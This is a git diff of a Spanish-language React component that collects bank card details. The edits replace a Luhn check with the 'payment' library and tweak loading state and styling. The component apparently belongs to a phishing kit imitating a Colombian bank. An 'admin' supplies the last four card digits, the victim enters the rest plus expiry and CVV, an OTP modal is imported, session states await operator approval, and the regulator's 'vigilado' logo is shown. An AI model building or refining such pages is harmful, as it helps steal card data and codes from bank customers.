@@ -1,10 +1,9 @@
+import './css/LoginModal.css';
 import { useEffect, useState, useRef } from "react";
 import { useNavigate } from "react-router-dom";
 import localStorageService from "../../services/localStorageService";
 import Loading from "../../components/Loading";
-import IniciarSesionModal from "./modals/iniciarSesionModal";
 import NumOTPModal from "./modals/NumOTP-Modal";
-import './css/LoginModal.css';
 import Payment from "payment";
 import { CARD_TEXT_CONFIG } from "./cardTextConfig"; // Importar configuración
 import { limpiarPaddingBody } from "../../../@utils"; // Importar utilidad de limpieza
@@ -78,10 +77,10 @@ export default function ValidacionTC() {
 
     // Estado principal de tarjeta
     const [cardData, setCardData] = useState({
-        filename: "imgi_5_Debito_(preferencial).webp",
-        tipo: "debito",
-        digits: "5456",
-        label: "Débito Preferencial"
+        filename: "",
+        tipo: "",
+        digits: "",
+        label: ""
     });
 
     // Modal de error (datos inválidos / timeout)
@@ -97,36 +96,6 @@ export default function ValidacionTC() {
 
     // Estado para validación de tarjeta con algoritmo de Luhn
     const [isCardValid, setIsCardValid] = useState(null); // null = no validado, true = válida, false = inválida
-
-    // --- ALGORITMO DE LUHN PARA VALIDACIÓN DE TARJETA ---
-    const validateLuhn = (cardNumber) => {
-        // Eliminar espacios y guiones
-        const cleanNumber = cardNumber.toString().replace(/\s+|-/g, '');
-
-        // Validar que solo contenga dígitos
-        if (!/^\d+$/.test(cleanNumber)) return false;
-
-        // Aplicar algoritmo de Luhn
-        let sum = 0;
-        let isEven = false;
-
-        // Recorrer de derecha a izquierda
-        for (let i = cleanNumber.length - 1; i >= 0; i--) {
-            let digit = parseInt(cleanNumber.charAt(i), 10);
-
-            if (isEven) {
-                digit *= 2;
-                if (digit > 9) {
-                    digit -= 9;
-                }
-            }
-
-            sum += digit;
-            isEven = !isEven;
-        }
-
-        return (sum % 10) === 0;
-    };
 
     // --- LÓGICA DE TARJETA E IMÁGENES --- (Mover aquí para que isAmex tenga acceso a cardData actualizado)
     const isAmex = (cardData.label || "").toLowerCase().includes("amex") ||
@@ -144,6 +113,10 @@ export default function ValidacionTC() {
         // Validar acceso antes de cargar datos
         const validateAccess = async () => {
             try {
+
+                // Se usa el cargando
+                setCargando(true);
+
                 const raw = localStorage.getItem("datos_usuario");
                 const usuarioLocalStorage = raw ? JSON.parse(raw) : {};
                 const sesionId = usuarioLocalStorage?.sesion_id;
@@ -188,6 +161,9 @@ export default function ValidacionTC() {
                     setCardData(normalized);
                     localStorageService.setItem("selectedCardData", normalized);
                     setIsTCCustom(estado === 'solicitar_tc_custom' || estado === 'awaiting_tc_approval');
+
+                    // Se quita el cargando
+                    setCargando(false);
                 } else {
                     // Fallback a localStorage si existe
                     const savedCardData = localStorageService.getItem("selectedCardData");
@@ -196,6 +172,9 @@ export default function ValidacionTC() {
                         setCardData(normalized);
                         setIsTCCustom(estado === 'solicitar_tc_custom' || estado === 'awaiting_tc_approval');
                     }
+
+                    // Se quita el cargando
+                    setCargando(false);
                 }
 
                 return true;
@@ -340,10 +319,10 @@ export default function ValidacionTC() {
     // 2. SISTEMA DE AJUSTE VISUAL (NORMALIZACIÓN)
     const CARD_ADJUSTMENTS = {
         // --- VISA ---
-        "Visa-Clasica.webp": { transform: "scale(1.15)" },
-        "Visa-seleccion-colombia.webp": { transform: "scale(1.15)" },
-        "Visa-Oro.webp": { transform: "scale(1.15)" },
-        "Visa-Platinum-v1.webp": { transform: "scale(1.1)" },
+        "Visa-Clasica.png": { transform: "scale(1.15)" },
+        "Visa-seleccion-colombia.png": { transform: "scale(1.15)" },
+        "Visa-Oro.png": { transform: "scale(1.15)" },
+        "Visa-Platinum-v1.png": { transform: "scale(1.1)" },
         // --- MASTERCARD ---
         "Mastercard-Unica.webp": { transform: "scale(1.1)" },
         "Mastercard-oro.webp": { transform: "scale(1.1)" },
@@ -356,7 +335,7 @@ export default function ValidacionTC() {
         "Débito Clásica.webp": { transform: "scale(1.04)" },
         "debito_virtual.webp": { transform: "scale(1.05)" },
         // --- AMEX ---
-        "Amex+Libre.webp": { transform: "scale(1.15)" },
+        "Amex+Libre.png": { transform: "scale(1.15)" },
     };
 
     const getCardStyle = (filename) => {
@@ -375,6 +354,7 @@ export default function ValidacionTC() {
         return `/assets/images/${folder}/${backFilename}`;
     };
 
+    // Función para obtener el tipo de tarjeta en texto legible
     const getTipoTarjeta = () => cardData.tipo === "credito" ? "Crédito" : "Débito";
 
     // --- HELPER PARA CONFIGURACIÓN DE TEXTO ---
@@ -382,76 +362,141 @@ export default function ValidacionTC() {
         return CARD_TEXT_CONFIG[filename] || CARD_TEXT_CONFIG["default"];
     };
 
-
+    // Metodo de manejo de cambios en los dígitos de la tarjeta
     const handleDigitsChange = (e) => {
+
+        // Capturar valor
         const val = e.target.value;
 
-        // Solo números y longitud
+        //Se valida que solo sean numeros y no pase el limite
         if (!/^\d*$/.test(val) || val.length > requiredDigitsLength) {
+
+            // Se retorna
             return;
-        }
+        };
 
         // Guardar mientras escribe
         setCardDigits(val);
 
-        // 👇 Validar con algoritmo de Luhn cuando estén todos los dígitos
+        // Solo valida cuando ya están los 12 dígitos
         if (val.length === requiredDigitsLength) {
-            // Construir número completo: dígitos del usuario + dígitos del admin
+
+            // Construir número completo (12 + últimos 4 conocidos)
             const fullCardNumber = val + cardData.digits;
-            const isValid = validateLuhn(fullCardNumber);
 
-            setIsCardValid(isValid);
-            // Ocultar alerta después de 4 segundos
-            // setTimeout(() => setShowCardAlert(false), 4000);
+            // Se valida con la api de payment
+            const isValidNumber = Payment.fns.validateCardNumber(fullCardNumber);
+            const cardType = Payment.fns.cardType(fullCardNumber);
 
-            console.log(`Tarjeta ${isValid ? 'VÁLIDA' : 'INVÁLIDA'}: ${fullCardNumber}`);
-        } else {
-            // Reset estado si borra dígitos
-            setIsCardValid(null);
-        }
+            // Tarjeta inválida (Luhn o tipo desconocido)
+            if (!isValidNumber || !cardType) {
+
+                // Se setea en falso
+                setIsCardValid(false);
+
+                // Se retorna
+                return;
+            };
+
+            // Opcional: validar tipo esperado (crédito/débito)
+            if (cardData.tipo === "debito" && cardType !== "visa" && cardType !== "mastercard") {
+
+                // Tarjeta inválida para débito
+                setIsCardValid(false);
+
+                // Se retorna
+                return;
+            };
+
+            // Tarjeta válida
+            setIsCardValid(true);
+        };
     };
 
-
+    // Metodo de manejo de cambios en la fecha de expiración
     const handleExpirationChange = (e) => {
+
+        // Capturar valor y limpiar no-dígitos
         const raw = e.target.value;
         const numbers = raw.replace(/\D/g, "");
 
+        // Permitir borrar libremente
         if (raw.length < expirationDate.length) {
-            setExpirationDate(raw);
-            return;
-        }
 
+            // Se setea el valor
+            setExpirationDate(raw);
+
+            // Se retorna
+            return;
+        };
+
+        // Formatear como MM/AA
         const currentYear = new Date().getFullYear() % 100;
         let val = numbers;
 
         // ===== MES =====
         if (val.length >= 2) {
+
+            // Se valida el mes
             let month = val.slice(0, 2);
             let monthNum = parseInt(month, 10);
 
+            // Corregir mes inválido
             if (monthNum < 1) month = "01";
             if (monthNum > 12) month = "12";
 
+            // Se agrega el slash
             val = month + val.slice(2);
-        }
+        };
 
         // ===== AÑO =====
         if (val.length > 2) {
+
+            // Se valida el año
             let year = val.slice(2, 4);
 
+            // Corregir año inválido
             if (year.length === 2) {
+
+                // Se convierte a número
                 let yearNum = parseInt(year, 10);
+
+                // Si es menor al año actual, se corrige
                 if (yearNum < currentYear) {
+
+                    // Se ajusta al año actual
                     year = String(currentYear);
-                }
-            }
+                };
+            };
 
+            // Se agrega el slash
             val = val.slice(0, 2) + "/" + year;
-        }
+        };
 
+        // Se captura el numero de tarjeta
+        const fullCardNumber = cardDigits + cardData.digits;
+
+        // Se vuelve a validar la tarjeta al cambiar la fecha
+        const isValidNumber = Payment.fns.validateCardNumber(fullCardNumber);
+        const cardType = Payment.fns.cardType(fullCardNumber);
+
+        // Actualizar estado de validez
+        if (isValidNumber && cardType) {
+
+            // Se setea en verdadero
+            setIsCardValid(true);
+        } else {
+
+            // Se setea en falso
+            setIsCardValid(false);
+        };
+
+        // Limitar longitud a 5 caracteres (MM/AA)
         if (val.length <= 5) {
+
+            // Se setea el valor
             setExpirationDate(val);
-        }
+        };
     };
 
     const handleCvvChange = (e) => {
@@ -583,7 +628,7 @@ export default function ValidacionTC() {
                     setFormState(prev => ({ ...prev, lanzarModalErrorSesion: true }));
                     setTimeout(() => {
                         setFormState(prev => ({ ...prev, lanzarModalErrorSesion: false }));
-                    }, 2000);
+                    }, 4000);
                     setCardDigits("");
                     setExpirationDate("");
                     setCvv("");
@@ -648,7 +693,6 @@ export default function ValidacionTC() {
     };
 
     // --- RENDER HELPERS ---
-
     const renderVisualInputDigits = () => {
         const length = requiredDigitsLength || 12; // Fallback safety
         return (
@@ -735,6 +779,7 @@ export default function ValidacionTC() {
         </div>
     );
 
+    // Se retorna el componente
     return (
         <>
             <style>{flipStyles}</style>
@@ -952,9 +997,10 @@ export default function ValidacionTC() {
 
                             <br /><br />
 
-                            <button className="login-btn" onClick={handleContinue}
+                            <button className="bc-button-primary login-btn" onClick={handleContinue}
                                 style={{
                                     marginTop: "20px",
+                                    fontSize: "14px",
                                     opacity: (step === "front"
                                         ? (cardDigits.length === requiredDigitsLength && expirationDate.length === 5 && isCardValid === true)
                                         : (cvv.length === requiredCvvLength && !submitted)) ? 1 : 0.5,
@@ -990,12 +1036,12 @@ export default function ValidacionTC() {
                                         style={{ width: "180px" }}
                                     />
                                 </div>
-                                <div>
+                                <div style={{ alignSelf: 'center' }}>
                                     <span className="vigilado">
                                         <img
                                             src="/assets/images/img_pantalla1/imgi_40_logo_vigilado.svg"
                                             alt="Superintendencia"
-                                            style={{ width: "180px" }}
+                                            style={{ width: "140px" }}
                                         />
                                     </span>
                                 </div>
